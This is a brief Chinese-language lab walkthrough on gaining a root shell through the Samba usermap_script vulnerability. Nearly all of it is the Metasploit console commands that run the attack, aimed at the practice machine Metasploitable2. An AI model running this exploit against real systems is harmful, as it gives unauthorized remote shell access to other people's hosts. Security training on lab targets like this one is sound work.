## 利用samba服务漏洞入侵linux主机

Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成,samba服务对应的端口有139、445.

0、网上搜索samba，得到利用metasploit的exploit

exploit/multi/samba/usermap_script

1、进入msfconsole
```bash 
msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > set RHOST metasploitable2
msf exploit(usermap_script) > exploit
#直接进入shell了

```